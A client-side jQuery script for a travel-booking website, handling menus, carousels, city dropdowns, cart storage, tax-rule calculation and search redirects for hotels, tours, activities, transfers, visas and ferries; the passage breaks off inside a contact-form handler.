$(document).ready(function () {

    $('.cmn-toggle-switch').on('click', function () {
        $('.main-menu').addClass('show');
    });
    $('#close_in').on('click', function () {
        $('.main-menu').removeClass('show');
    });

    $(function () {

        $('form').attr('autocomplete', 'off');

        $('input').attr('autocomplete', 'off');



        //Lazy Load the cities

        city_lzloading('#hotel_city_filter,#activities_city_filter,#city,#ffrom_city_filter,#fto_city_filter');

    });



    if ($('.dropdown.selectable').length > 0) {

        $('.dropdown.selectable .dropdown-item').on('click', function () {

            var thisOption = $(this)[0].textContent;

            $(this).parents('.dropdown.selectable').children('.btn-dd')[0].textContent = thisOption;

        })

    }



    $('body').delegate('.c-userBlock .card .st-editProfile', 'click', function () {

        var thidParent = $(this).parents('.card');

        if (!thidParent.hasClass('st-editable')) {

            thidParent.addClass('st-editable');

            thidParent.find('.formField').find('.txtBox').prop('readonly', false);

            thidParent.find('.formField').find('.txtBox').prop('disabled', false);

        } else {

            thidParent.removeClass('st-editable');

            thidParent.find('.formField').find('.txtBox').prop('readonly', true);

            thidParent.find('.formField').find('.txtBox').prop('disabled', true);

        }

    })

    $('.mobile_hamb, .closeSidebar').on('click', function () {

        $('body').addClass('st-sidebarOpen');

    });

    $('.closeSidebar').on('click', function () {

        $('body').removeClass('st-sidebarOpen');

    });

    // initilizeDropdown();

    if ($('.js-cardSlider').length > 0) {

        $('.js-cardSlider').owlCarousel({

            loop: false,

            margin: 16,

            nav: true,

            dots: false,

            responsive: {

                0: {

                    items: 1

                },

                560: {

                    items: 2

                },

                960: {

                    items: 3

                },

                1024: {

                    items: 4

                }

            }

        });

    }



    if ($('.ts-testimonial-slider').length > 0) {

        $('.ts-testimonial-slider').owlCarousel({

            loop: false,

            margin: 16,

            dots: false,

            nav: true,

            navText: ["<img src='images/left-arrow.png'>", "<img src='images/right-arrow.png'>"],

            responsive: {

                0: {

                    items: 1

                },

                560: {

                    items: 1

                },

                960: {

                    items: 1

                },

                1024: {

                    items: 1

                }

            }

        });

    }



    if ($('.js-mainSlider').length > 0) {

        $('.js-mainSlider').owlCarousel({

            margin: 0,

            nav: false,

            dots: false,

            items: 1,

            loop: true,

            autoplay: true,

            autoplayHoverPause: true,

            smartSpeed: 1500

        });

    }



    // filters option

    $('.c-checkSquare .filterCheckbox').on('click', function () {

        //e.preventDefault();

        if ($(this).hasClass('st-checked')) {

            $(this).removeClass('st-checked');

        } else {

            $(this).addClass('st-checked');

        }

    });



    //**Site Tooltips

    $(function () {

        if ($("[data-toggle='tooltip']").length > 0) {

            $("[data-toggle='tooltip']").tooltip({ placement: 'bottom' });

        }

    });



    if ($('.c-select2DD').length) {

        // 	$('.c-select2DD select').select2();

        $('.c-select2DD select').select2({

            minimumInputLength: 1

        });

    }



    // ------ Function to load gallery after inirialize

    $("body").delegate(".js-gallery", "click", function () {

        const tabID = $(this).attr("id");

        const galleryID = $("#gallery-" + tabID.split("-")[1]);

        if (galleryID.hasClass("loaded")) {

            return;

        } else {

            galleryID.prepend('<div class="galleryLoader"></div>');

            setTimeout(function () {

                galleryID.children(".galleryLoader").remove();

                galleryID.find(".c-photoGallery").removeClass("js-dynamicLoad");

                galleryID.addClass("loaded");

            }, 1500);

        }

    });

});



function error_msg_alert(message, base_url = '') {

    if (base_url == '') {

        var base_url1 = $('#base_url').val() + 'Tours_B2B/notification_modal.php';

    } else {

        var base_url1 = base_url + 'notification_modal.php';

    }

    var class_name = 'alert-danger';

    $.post(base_url1, { message: message, class_name: class_name }, function (data) {

        $('#site_alert').html(data);

    });

}



function success_msg_alert(message, base_url = '') {

    if (base_url == '') {

        var base_url1 = $('#base_url').val() + 'Tours_B2B/notification_modal.php';

    } else {

        var base_url1 = base_url + 'notification_modal.php';

    }

    var class_name = 'alert-success';

    $.post(base_url1, { message: message, class_name: class_name }, function (data) {

        $('#site_alert').html(data);

    });

}



function blockSpecialChar(e) {

    var k = e.keyCode;

    return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));

}



// Compare best low cost with price-range filter minmax values

function compare(best_lowest_cost, fromRange_cost, toRange_cost) {

    if (

        parseFloat(best_lowest_cost) >= parseFloat(fromRange_cost) &&

        parseFloat(best_lowest_cost) <= parseFloat(toRange_cost)

    )

        return 1;

}

// JQuery range slider

function reinit(bestlow_cost, besthigh_cost) {

    var randno = 'slider_' + new Date().getTime();

    $('.slider-input').attr({

        id: randno,

        min: bestlow_cost,

        max: besthigh_cost,

    });

    $('.sliderr-input').jRange('disable');

    setTimeout(() => {



        var valueText = parseFloat(bestlow_cost).toFixed(2) + ',' + parseFloat(besthigh_cost).toFixed(2);

        $('#' + randno).val(valueText);

        var rangeMinValue = document.getElementById(randno).min;

        var rangeMaxValue = document.getElementById(randno).max;

        var rangeStep = $('#' + randno).data('step');





        $('#' + randno).jRange({

            from: rangeMinValue,

            to: rangeMaxValue,

            step: rangeStep,

            showLabels: true,

            isRange: true,

            width: 210,

            showScale: true,

            onbarclicked: function () {

                passSliderValue();

            },

            ondragend: function () {

                passSliderValue();

            }

        });

    }, 1000);

}



//Generate uuid for each item

function uuidv4() {

    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {

        var r = Math.random() * 16 | 0,

            v = c == 'x' ? r : (r & 0x3 | 0x8);

        return v.toString(16);

    });

}

//Display Cart

function display_cart(cart_item_count) {

    var base_url = $('#base_url').val();

    var register_id = $('#register_id').val();

    var cart_item_count = $('#' + cart_item_count).html();



    if (typeof Storage !== 'undefined') {

        if (localStorage) {

            var cart_list_arr = JSON.parse(localStorage.getItem('cart_list_arr'));

        } else {

            var cart_list_arr = JSON.parse(window.sessionStorage.getItem('cart_list_arr'));

        }

    }

    $.post(base_url + 'Tours_B2B/cart_data_modal.php', { cart_list_arr: cart_list_arr, register_id: register_id }, function (data) {

        $('#cart_div').html(data);

    })

}

//Get Cart data items

function get_cart_items(cart_list_arr) {

    var base_url = $('#base_url').val();

    $.post(base_url + 'Tours_B2B/get_cart_items.php', { cart_list_arr: cart_list_arr }, function (data) {

        $('#cart_items').html(data);

    });

}

//Get checkout page cart data items

function get_checkoutpage_cart() {

    var base_url = $('#base_url').val();

    if (typeof Storage !== 'undefined') {

        if (localStorage) {

            var currency_id = localStorage.getItem('global_currency');

        } else {

            var currency_id = window.sessionStorage.getItem('global_currency');

        }

    }

    if (typeof Storage !== 'undefined') {

        if (localStorage) {

            var cart_list_arr = JSON.parse(localStorage.getItem('cart_list_arr'));

        } else {

            var cart_list_arr = JSON.parse(window.sessionStorage.getItem('cart_list_arr'));

        }

    }



    $.post(base_url + 'Tours_B2B/checkout_pages/get_checkoutpage_cart.php', { cart_list_arr: cart_list_arr, currency: currency_id }, function (data) {

        $('#get_checkoutpage_cart').html(data);

    });

}

//Checkout page country selection

function get_country_code(country_id, country_code) {

    var base_url = $('#base_url').val();

    var country_id = $('#' + country_id).val();



    $.post(base_url + 'Tours_B2B/view/get_country_code.php', { country_id: country_id }, function (data) {

        $('#country_code').val(data);

    });

}



function get_select_hotel(city_id, hotel_id, check_indate, check_outdate) {



    var base_url = $('#base_url').val();

    var final_arr = [];

    final_arr.push({

        rooms: {

            room: parseInt(1),

            adults: parseInt(2),

            child: parseInt(0),

            childAge: []

        }

    });

    adult_count = 2;

    child_count = 0;

    final_arr = JSON.stringify(final_arr);

    // Store

    if (window.sessionStorage) {

        try {

            sessionStorage.setItem('final_arr', final_arr);

        } catch (e) {

            console.log(e);

        }

    }

    var hotel_array = [];

    hotel_array.push({

        'city_id': city_id,

        'hotel_id': hotel_id,

        'check_indate': check_indate,

        'check_outdate': check_outdate,

        'star_category_arr': [],

        'dynamic_room_count': parseInt(1),

        'adult_count': adult_count,

        'child_count': child_count,

        'final_arr': final_arr,

        'nationality': ''

    })

    $.post(base_url + 'controller/hotel/b2b/search_session_save.php', { hotel_array: hotel_array }, function (data) {

        window.location.href = base_url + 'Tours_B2B/view/hotel/hotel-listing.php';

    });

}



function get_select_activity(activity_city_id, activities_id, checkDate) {



    var base_url = $('#base_url').val();

    var adult = 1;

    var child = 0;

    var infant = 0;



    var activity_array = [];

    activity_array.push({

        'activity_city_id': activity_city_id,

        'activities_id': activities_id,

        'checkDate': checkDate,

        'adult': parseInt(adult),

        'child': parseInt(child),

        'infant': parseInt(infant)

    })

    $.post(base_url + 'controller/b2b_excursion/b2b/search_session_save.php', { activity_array: activity_array }, function (data) {

        window.location.href = base_url + 'Tours_B2B/view/activities/activities-listing.php';

    });

}



function get_select_package(dest_id, tour_id, tour_date) {



    var base_url = $('#base_url').val();

    var adult = 2;



    if (dest_id == '' && tour_id == '') {

        error_msg_alert('Select atleast Destination!');

        return false;

    }

    if (parseInt(adult) === 0) {

        error_msg_alert('Select No of. Adults!');

        return false;

    }



    var tours_array = [];

    tours_array.push({

        'dest_id': dest_id,

        'tour_id': tour_id,

        'tour_date': tour_date,

        'adult': parseInt(adult),

        'child_wobed': parseInt(0),

        'child_wibed': parseInt(0),

        'extra_bed': parseInt(0),

        'infant': parseInt(0)

    })

    $.post(base_url + 'controller/custom_packages/search_session_save.php', { tours_array: tours_array }, function (data) {

        window.location.href = base_url + 'Tours_B2B/view/tours/tours-listing.php';

    });

}



function get_select_hotel_guest(city_id, hotel_id, check_indate, check_outdate) {

    var base_url = $('#base_url').val();



    var final_arr = [];

    final_arr.push({

        rooms: {

            room: parseInt(1),

            adults: parseInt(2),

            child: parseInt(0),

            childAge: []

        }

    });

    adult_count = 2;

    child_count = 0;

    final_arr = JSON.stringify(final_arr);

    // Store

    if (window.sessionStorage) {

        try {

            sessionStorage.setItem('final_arr', final_arr);

        } catch (e) {

            console.log(e);

        }

    }

    const url = 'city_id=' +

        window.btoa(city_id) +

        '&hotel_id=' +

        window.btoa(hotel_id) +

        '&check_indate=' +

        encodeURIComponent(check_indate) +

        '&check_outdate=' +

        encodeURIComponent(check_outdate) +

        '&star_category_arr=' +

        encodeURIComponent('') +

        '&dynamic_room_count=' +

        window.btoa(1) +

        '&adult_count=' +

        window.btoa(adult_count) +

        '&child_count=' +

        window.btoa(child_count) +

        '&final_arr=' +

        encodeURIComponent(final_arr) +

        '&nationality=' +

        encodeURIComponent('');



    window.location.href = base_url + 'Tours_B2B/view/hotel_guest/hotel-listing.php?' + url;

}



function pagination_load(dataset, columns, bg_stat = false, footer_string = false, pg_length = 20, table_id) { //1. dataset,2.columns titles,3.if want bg color,4.if want footer,5.manual pagelength change

    var html = "";

    var dataset_main = JSON.parse(dataset);

    if (bg_stat) {

        var table_data = [];

        var bg = [];

        $.each(dataset_main, function (i, item) {

            table_data.push(dataset_main[i].data) // keeping different arrays for data and background color

            bg.push(dataset_main[i].bg)

        });

        table_data = JSON.parse(JSON.stringify(table_data));

    } else {

        var table_data = JSON.parse(dataset);

    }

    if (footer_string) {

        table_data.pop();

        if ($.trim($('#' + table_id + ' tfoot').html())) {

            document.getElementById(table_id).deleteTFoot();

        }

        for (var i = 0; i < parseInt(dataset_main[dataset_main.length - 1].footer_data['total_footers']); i++) {

            html += "<td colspan='" + dataset_main[dataset_main.length - 1].footer_data['col' + i] + "'>" + dataset_main[dataset_main.length - 1].footer_data['namecol' + i] + " : " + dataset_main[dataset_main.length - 1].footer_data['foot' + i] + "</td>";

        }

        html = "<tfoot><tr>" + html + "</tr></tfoot>";

    }

    if ($.fn.DataTable.isDataTable("#" + table_id)) {

        $('#' + table_id).DataTable().clear().destroy(); // for managin error

    }



    var table = $('#' + table_id).DataTable({

        data: table_data,

        "pageLength": pg_length,

        columns: columns,

        "searching": true,

        createdRow: function (row, data, dataIndex) { // adds bg color for every invalid point

            if (bg) {

                $(row).addClass(bg[dataIndex]);

            }

        }

    });

    $('#' + table_id).append(html);

}

//City Dropdown Lazy Loading

function city_lzloading(element) {

    var base_url = $("#crm_base_url").val();

    url = base_url + '/view/load_data/generic_city_loading.php';



    $(element).select2({

        placeholder: "City Name",

        ajax: {

            url: url,

            dataType: 'json',

            type: 'GET',

            data: function (params) { return { term: params.term, page: params.page || 0 } },

            processResults: function (data) {

                let more = data.pagination;

                return {

                    results: data.results,

                    pagination: {

                        more: more.more,

                    }

                };

            }

        }

    });

}

//Selected currency rates

function get_currency_rates(to, from) {

    var cache_currencies = JSON.parse($('#cache_currencies').val());

    var to_currency = (cache_currencies.find(el => el.currency_id === to) !== undefined) ? cache_currencies.find(el => el.currency_id === to) : '0';

    var from_currency = (cache_currencies.find(el => el.currency_id === from) !== undefined) ? cache_currencies.find(el => el.currency_id === from) : '0';



    return to_currency.currency_rate + '-' + from_currency.currency_rate;

}



function get_service_tax(result) {



    //////////////////////////////

    var taxes_result = result && result.filter((rule) => {

        var { entry_id, rule_id } = rule;

        return entry_id !== '' && !rule_id;

    });

    //////////////////////////////

    var final_taxes_rules = [];

    taxes_result &&

        taxes_result.filter((tax_rule) => {

            var tax_rule_array = [];

            result &&

                result.forEach((rule) => {

                    if (parseInt(tax_rule['entry_id']) === parseInt(rule['entry_id']) && rule['rule_id'])

                        tax_rule_array.push(rule);

                });

            final_taxes_rules.push({ entry_id: tax_rule['entry_id'], tax_rule_array });

        });

    ///////////////////////////

    let applied_rules = [];

    final_taxes_rules &&

        final_taxes_rules.map((tax) => {

            var entry_id_rules = tax['tax_rule_array'];

            var flag = false;

            var conditions_flag_array = [];

            entry_id_rules &&

                entry_id_rules.forEach((rule) => {



                    if (rule['applicableOn'] == '1')

                        return;

                    var condition = JSON.parse(rule['conditions']);

                    condition &&

                        condition.forEach((cond) => {

                            var condition = cond.condition;

                            var for1 = cond.for1;

                            var value = cond.value;

                            if (condition === "1") {

                                var place_flag = null;

                                place_flag_array = [];

                                $.ajax({

                                    async: false,

                                    type: 'POST',

                                    global: false,

                                    dataType: 'html',

                                    url: '../../view/get_states.php',

                                    data: {},

                                    success: (data) => {

                                        data = data.split('-');

                                        switch (for1) {

                                            case '!=':

                                                if (data[0] !== value) place_flag = true;

                                                else place_flag = false;

                                                break;

                                            case '==':

                                                if (data[0] === value) place_flag = true;

                                                else place_flag = false;

                                                break;

                                            default:

                                                place_flag = false;

                                        }

                                    }

                                });

                                flag = place_flag;

                            }

                        })

                    if (flag === true) applied_rules.push(rule);

                });

        });

    ////////////////////////////////////////

    var applied_taxes = '';

    var ledger_posting = '';

    applied_rules && applied_rules.map((rule) => {

        var tax_data = taxes_result.find((entry_id_tax) => entry_id_tax['entry_id'] === rule['entry_id']);

        var { rate_in, rate } = tax_data;

        var { ledger_id, name } = rule;

        if (applied_taxes != '') {

            applied_taxes = applied_taxes + '+' + name + ':' + rate + ':' + rate_in;

            ledger_posting = ledger_posting + '+' + ledger_id;

        } else {

            applied_taxes += name + ':' + rate + ':' + rate_in;

            ledger_posting += ledger_id;

        }

    });

    return applied_taxes + ',' + ledger_posting;

}



//Add to Cart

function add_to_cart(id, type) {



    var base_url = $('#base_url').val();

    var register_id = $('#register_id').val();

    var service_data_array = [];

    if (type === "hotel") {



        var city_id = $('#hotel_city_filter').val();

        var check_indate = $('#check_indate').val();

        var check_outdate = $('#check_outdate').val();



        var result = get_other_rules('Hotel', check_indate);

        var applied_taxes = get_service_tax(result);



        var rooms = $('#rooms').val();

        var room_type_arr = new Array();



        for (var i = 1; i <= rooms; i++) {

            var input_name = 'result_day' + id + i;

            $('input[name=' + input_name + ']:checked').each(function () {

                room_type_arr.push($(this).val());

            });

        }

        if (room_type_arr.length == 0) {

            error_msg_alert('Please select at least one Room!');

            return false;

        }

        service_data_array.push({

            'check_indate': check_indate,

            'check_outdate': check_outdate

        });

        var final_arr = JSON.parse(sessionStorage.getItem('final_arr'));

        const huuid = uuidv4();

        $.post(

            base_url + 'Tours_B2B/view/get_hotel_tax.php', { register_id: register_id, huuid: huuid, id: id, city_id: city_id, check_indate: check_indate, check_outdate: check_outdate, room_type_arr: room_type_arr, final_arr: final_arr, applied_taxes: applied_taxes },

            function (data) {

                var data = JSON.parse(data);

                try {

                    var cart_list_arr1 = JSON.parse(localStorage.getItem('cart_list_arr'));

                    cart_list_arr1 = cart_list_arr1 !== null ? cart_list_arr1 : [];

                    cart_list_arr1.push({

                        service: {

                            uuid: huuid,

                            name: 'Hotel',

                            id: id,

                            city_id: city_id,

                            check_in: check_indate,

                            check_out: check_outdate,

                            hotel_arr: data,

                            item_arr: room_type_arr,

                            final_arr: final_arr

                        }

                    });

                    localStorage.setItem('cart_list_arr', JSON.stringify(cart_list_arr1));

                    document.getElementById('cart_item_count').innerHTML = cart_list_arr1.length;

                    success_msg_alert('Hotel successfully added into the cart!');

                } catch (e) {

                    console.error(e);

                }

            }

        );

    } else if (type === "transfer") {



        var image = $('#image-' + id).val();

        var no_of_vehicles = $('#vehicle_count-' + id).html();

        var vehicle_name = $('#vehicle_name-' + id).html();

        var vehicle_type = $('#vehicle_type-' + id).html();

        var transfer_cost = $('#transfer-' + id).val();

        var pickup_date = $('#pickup_date').val();

        var return_date = $('#return_date').val();

        var passengers = $('#passengers').val();



        var result = get_other_rules('Car Rental', pickup_date);

        var applied_taxes = get_service_tax(result);



        var ele = document.getElementsByName('transfer_type');

        for (i = 0; i < 2; i++) {

            if (ele[i].checked) {

                var trip_type = ele[i].value;

            }

        }

        if (trip_type === "roundtrip") {

            if (return_date == "") { error_msg_alert('Please select Return Date & Time '); return false; }

            var valid = check_valid_date_trs();

            if (!valid) {

                error_msg_alert('Invalid Pickup and Return Date!');

                return false;

            }

        } else {

            return_date = '';

        }

        var pickup_type = 0;

        var pickup_from = 0;

        var drop_type = 0;

        var drop_to = 0;

        $('#pickup_location').find("option:selected").each(function () {

            pickup_type = ($(this).closest('optgroup').attr('value'));

            pickup_from = ($(this).closest('option').attr('value'));

        });

        $('#dropoff_location').find("option:selected").each(function () {

            drop_type = ($(this).closest('optgroup').attr('value'));

            drop_to = ($(this).closest('option').attr('value'));

        });

        service_data_array.push({

            'trip_type': trip_type,

            'pickup_type': pickup_type,

            'pickup_from': pickup_from,

            'drop_type': drop_type,

            'drop_to': drop_to,

            'pickup_date': pickup_date,

            'return_date': return_date,

            'passengers': passengers,

            'no_of_vehicles': no_of_vehicles,

            'vehicle_name': vehicle_name,

            'vehicle_type': vehicle_type,

            'transfer_cost': transfer_cost,

            'image': image,

            'taxation': applied_taxes

        });

        try {

            var cart_list_arr1 = JSON.parse(localStorage.getItem('cart_list_arr'));

            cart_list_arr1 = cart_list_arr1 !== null ? cart_list_arr1 : [];

            cart_list_arr1.push({

                service: {

                    uuid: uuidv4(),

                    name: 'Transfer',

                    id: id,

                    service_arr: service_data_array

                }

            });

            localStorage.setItem('cart_list_arr', JSON.stringify(cart_list_arr1));

            document.getElementById('cart_item_count').innerHTML = cart_list_arr1.length;

            $.post(base_url + 'controller/b2b_customer/update_cart.php', { register_id: register_id, cart_list_arr: cart_list_arr1 }, function (data) {

                success_msg_alert('Transfer successfully added into the cart!');

            });

        } catch (e) {

            console.error(e);

        }

    } else if (type === "Activity") {

        var image = $('#image-' + id).val();

        var act_name = $('#act_name-' + id).html();

        var rep_time = $('#rep_time-' + id).html();

        var pick_point = $('#pick_point-' + id).html();

        var taxation = $('#taxation-' + id).val();

        var checkDate = $('#checkDate').val();

        var total_pax = $('#total_pax').val();



        var result = get_other_rules('Activity', checkDate);

        var applied_taxes = get_service_tax(result);



        var input_name = 'result' + id;

        var coupon = JSON.parse($('#coupon-' + id).val());

        var transfer_type = '';

        $('input[name=' + input_name + ']:checked').each(function () {

            transfer_type = ($(this).val());

        });

        if (transfer_type == '') {

            error_msg_alert('Please select at least one Transfer Type!');

            return false;

        }

        service_data_array.push({

            'id': id,

            'image': image,

            'act_name': act_name,

            'rep_time': rep_time,

            'pick_point': pick_point,

            'taxation': applied_taxes,

            'checkDate': checkDate,

            'total_pax': total_pax,

            'transfer_type': transfer_type,

            'coupon': coupon

        });

        try {

            var cart_list_arr1 = JSON.parse(localStorage.getItem('cart_list_arr'));

            cart_list_arr1 = cart_list_arr1 !== null ? cart_list_arr1 : [];

            cart_list_arr1.push({

                service: {

                    uuid: uuidv4(),

                    name: 'Activity',

                    id: id,

                    service_arr: service_data_array

                }

            });

            localStorage.setItem('cart_list_arr', JSON.stringify(cart_list_arr1));

            document.getElementById('cart_item_count').innerHTML = cart_list_arr1.length;

            $.post(base_url + 'controller/b2b_customer/update_cart.php', { register_id: register_id, cart_list_arr: cart_list_arr1 }, function (data) {

                success_msg_alert('Activity successfully added into the cart!');

            });

        } catch (e) {

            console.error(e);

        }

    } else if (type === "Tours") {



        var image = $('#image-' + id).val();

        var package = $('#package-' + id).html();

        var package_code = $('#package_code-' + id).html();

        var total_cost = $('#tours-cost-' + id).val();

        total_cost = total_cost.split('-');

        var currency_id = $('#h_currency_id-' + id).html();

        var days = $('#days-' + id).val();

        days = days.split('-');

        var taxation = $('#taxation-' + id).val();

        var total_passengers = $('#total_passengers').val();

        total_passengers = total_passengers.split('-');

        var travel_date = $('#travelDate').val();

        var note = $('#note').html();



        var result = get_other_rules('Package Tour', travel_date);

        var applied_taxes = get_service_tax(result);



        service_data_array.push({

            'id': id,

            'image': image,

            'package': package,

            'package_code': package_code,

            'travel_date': travel_date,

            'nights': parseInt(days[0]),

            'days': parseInt(days[1]),

            'adult': parseInt(total_passengers[0]),

            'childwo': parseInt(total_passengers[1]),

            'childwi': parseInt(total_passengers[2]),

            'extra_bed': parseInt(total_passengers[3]),

            'infant': parseInt(total_passengers[4]),

            'taxation': applied_taxes,

            'total_cost': total_cost[0],

            'currency_id': currency_id,

            'note': note

        });

        try {

            var cart_list_arr1 = JSON.parse(localStorage.getItem('cart_list_arr'));

            cart_list_arr1 = cart_list_arr1 !== null ? cart_list_arr1 : [];

            cart_list_arr1.push({

                service: {

                    uuid: uuidv4(),

                    name: 'Combo Tours',

                    id: id,

                    service_arr: service_data_array

                }

            });

            localStorage.setItem('cart_list_arr', JSON.stringify(cart_list_arr1));

            document.getElementById('cart_item_count').innerHTML = cart_list_arr1.length;

            $.post(base_url + 'controller/b2b_customer/update_cart.php', { register_id: register_id, cart_list_arr: cart_list_arr1 }, function (data) {

                success_msg_alert('Tour successfully added into the cart!');

            });

        } catch (e) {

            console.error(e);

        }

    }

}



function cart_error_pop() {

    var base_url = $('#base_url').val();

    error_msg_alert('Please <a target="_blank" href="' + base_url + 'view/b2b_customer/registration/index.php">Register</a> or <a target="_blank" href="' + base_url + 'Tours_B2B/login.php">Login</a> here for the bookings.');

}

//Print

function loadOtherPage(url) {

    $('<iframe>').attr('src', url).appendTo('body');

    // window.location.href= url;

}



function get_other_rules(travel_type, invoice_date) {



    // convert date to y/m/data

    var data = new Date(invoice_date);

    let month = data.getMonth() + 1;

    let day = data.getDate();

    let year = data.getFullYear();

    if (day <= 9)

        day = '0' + day;

    if (month < 10)

        month = '0' + month;

    invoice_date = year + '-' + month + '-' + day;



    var cache_rules = JSON.parse($('#cache_currencies').val());

    var taxes = [];

    taxes = (cache_rules.filter((el) =>

        el.entry_id !== '' && el.rule_id === undefined && el.entry_id !== undefined && el.currency_id === undefined

    ));



    //Taxes

    var taxes1 = taxes.filter((tax) => {

        return tax['status'] === 'Active';

    });



    //Tax Rules

    var tax_rules = [];

    tax_rules = (cache_rules.filter((el) =>

        el.rule_id !== '' && el.rule_id !== undefined

    ));



    invoice_date = new Date(invoice_date).getTime();

    var tax_rules1 = tax_rules.filter((rule) => {

        var from_date = new Date(rule['from_date']).getTime();

        var to_date = new Date(rule['to_date']).getTime();



        return (

            rule['status'] === 'Active' &&

            (rule['travel_type'] === travel_type || rule['travel_type'] === 'All') &&

            (rule['validity'] == 'Permanent' || (invoice_date >= from_date && invoice_date <= to_date))

        );

    });



    var result = taxes1.concat(tax_rules1);

    return result;

}



//Get Date

function get_to_date1(from_date, to_date) {

    var from_date1 = $('#' + from_date).val();

    if (from_date1 != '') {

        var edate = from_date1.split('-');

        e_date = new Date(edate[2], edate[1] - 1, edate[0]).getTime();

        var currentDate = new Date(new Date(e_date).getTime() + 24 * 60 * 60 * 1000);

        var day = currentDate.getDate();

        var month = currentDate.getMonth() + 1;

        var year = currentDate.getFullYear();

        if (day < 10) {

            day = '0' + day;

        }

        if (month < 10) {

            month = '0' + month;

        }

        $('#' + to_date).val(day + '-' + month + '-' + year);

    } else {

        $('#' + to_date).val('');

    }

}

//function for valid date tariff

function validate_validDate1(from, to) {



    var base_url = $('#crm_base_url').val();

    var from_date = $('#' + from).val();

    var to_date = $('#' + to).val();



    var edate = from_date.split('-');

    e_date = new Date(edate[2], edate[1] - 1, edate[0]).getTime();

    var edate1 = to_date.split('-');

    e_date1 = new Date(edate1[2], edate1[1] - 1, edate1[0]).getTime();



    var from_date_ms = new Date(e_date).getTime();

    var to_date_ms = new Date(e_date1).getTime();



    if (from_date_ms > to_date_ms) {

        error_msg_alert('Date should not be greater than valid to date', base_url);

        $('#' + from).css({ border: '1px solid red' });

        document.getElementById(from).value = '';

        $('#' + from).focus();

        g_validate_status = false;

        return false;

    } else {

        $('#' + from).css({ border: '1px solid #ddd' });

        return true;

    }

    return true;

}

function get_tours_data(dest_id, type, unique_id = null) {



    var base_url = $('#crm_base_url').val();

    var b2c_base_url = $('#base_url').val();

    var currency = $('#currency').val();

    var tours_array = [];

    if (type == '1' || type == '2') {



        if (type == '1') {



            var tomorrow = new Date();

            tomorrow.setDate(tomorrow.getDate() + 10);

            var day = tomorrow.getDate();

            var month = tomorrow.getMonth() + 1

            var year = tomorrow.getFullYear();

            if (day < 10) {

                day = '0' + day;

            }

            if (month < 10) {

                month = '0' + month;

            }

            var date = month + "/" + day + "/" + year;



            tours_array.push({

                'dest_id': dest_id,

                'tour_id': '',

                'tour_date': date,

                'adult': parseInt(1),

                'child_wobed': parseInt(0),

                'child_wibed': parseInt(0),

                'extra_bed': parseInt(0),

                'infant': parseInt(0)

            });

        } else if (type == '2') {



            tours_array.push({

                'dest_id': dest_id,

                'tour_id': '',

                'tour_group_id': '',

                'adult': parseInt(1),

                'child_wobed': parseInt(0),

                'child_wibed': parseInt(0),

                'extra_bed': parseInt(0),

                'infant': parseInt(0)

            });

        }

        $.post(base_url + 'controller/custom_packages/search_session_save.php', { tours_array: tours_array, currency: currency }, function (data) {

            if (type == '1') {

                window.location.href = b2c_base_url + 'view/tours/tours-listing.php';

            } else if (type == '2') {

                window.location.href = b2c_base_url + 'view/group_tours/tours-listing.php';

            }

        });

    } else if (type == '3') {



        var hotel_array = [];



        var today = new Date();

        today.setDate(today.getDate());

        var day = today.getDate();

        var month = today.getMonth() + 1;

        var year = today.getFullYear();

        if (day < 10) {

            day = '0' + day;

        }

        if (month < 10) {

            month = '0' + month;

        }

        var today_date = month + "/" + day + "/" + year;



        var tomm = new Date();

        tomm.setDate(tomm.getDate() + 1);

        var day = tomm.getDate();

        var month = tomm.getMonth() + 1

        var year = tomm.getFullYear();

        if (day < 10) {

            day = '0' + day;

        }

        if (month < 10) {

            month = '0' + month;

        }

        var tomm_date = month + "/" + day + "/" + year;



        hotel_array.push({

            'city_id': dest_id,

            'hotel_id': unique_id,

            'check_indate': today_date,

            'check_outdate': tomm_date,

            'star_category_arr': [],

            'total_rooms': ''

        });

        $.post(base_url + 'controller/hotel/b2c_search_session_save.php', { hotel_array: hotel_array }, function (data) {

            window.location.href = b2c_base_url + 'view/hotel/hotel-listing.php';

        });

    } else if (type == '4') {



        var activity_array = [];



        var today = new Date();

        today.setDate(today.getDate());

        var day = today.getDate();

        var month = today.getMonth() + 1;

        var year = today.getFullYear();

        if (day < 10) {

            day = '0' + day;

        }

        if (month < 10) {

            month = '0' + month;

        }

        var today_date = month + "/" + day + "/" + year;



        activity_array.push({

            'activity_city_id': dest_id,

            'activities_id': unique_id,

            'checkDate': today_date,

            'adult': parseInt(1),

            'child': parseInt(0),

            'infant': parseInt(0)

        });

        $.post(base_url + 'controller/b2b_excursion/b2b/search_session_save.php', { activity_array: activity_array }, function (data) {

            window.location.href = b2c_base_url + 'view/activities/activities-listing.php';

        });

    } else if (type == '5') {



        var today = new Date();

        today.setDate(today.getDate());

        var day = today.getDate();

        var month = today.getMonth() + 1;

        var year = today.getFullYear();

        if (day < 10) {

            day = '0' + day;

        }

        if (month < 10) {

            month = '0' + month;

        }

        var today_date = month + "/" + day + "/" + year;



        var pick_drop_array = [];

        pick_drop_array.push({

            'trip_type': 'oneway',

            'pickup_type': '',

            'pickup_from': '',

            'drop_type': '',

            'drop_to': '',

            'pickup_date': today_date,

            'return_date': '',

            'passengers': '1'

        })

        $.post(base_url + 'controller/b2b_transfer/b2b/search_session_save.php', { pick_drop_array: pick_drop_array }, function (data) {

            window.location.href = b2c_base_url + 'view/transfer/transfer-listing.php';

        });

    } else if (type == '6') {



        var visa_array = [];

        visa_array.push({

            'country_id': ''

        });

        $.post(base_url + 'controller/visa_master/search_session_save.php', { visa_array: visa_array }, function (data) {

            window.location.href = b2c_base_url + 'view/visa/visa-listing.php';

        });

    } else if (type == '7') {



        var today = new Date();

        today.setDate(today.getDate());

        var day = today.getDate();

        var month = today.getMonth() + 1;

        var year = today.getFullYear();

        if (day < 10) {

            day = '0' + day;

        }

        if (month < 10) {

            month = '0' + month;

        }

        var today_date = month + "/" + day + "/" + year;

        var ferry_array = [];

        ferry_array.push({

            'from_city': '',

            'to_city': '',

            'travel_date': today_date,

            'adult': parseInt(1),

            'children': parseInt(0),

            'infant': parseInt(0)

        })

        $.post(base_url + 'controller/ferry/search_session_save.php', { ferry_array: ferry_array }, function (data) {

            window.location.href = b2c_base_url + 'view/ferry/ferry-listing.php';

        });

    }

}


$(function () {

    $('#contact_us_form').validate({

        rules: {

        },

        submitHandler: function (form) {

            $('#contact_form_send').prop('disabled', true);

            var crm_base_url = $('#crm_base_url').val();

            var base_url = $('#base_url').val();

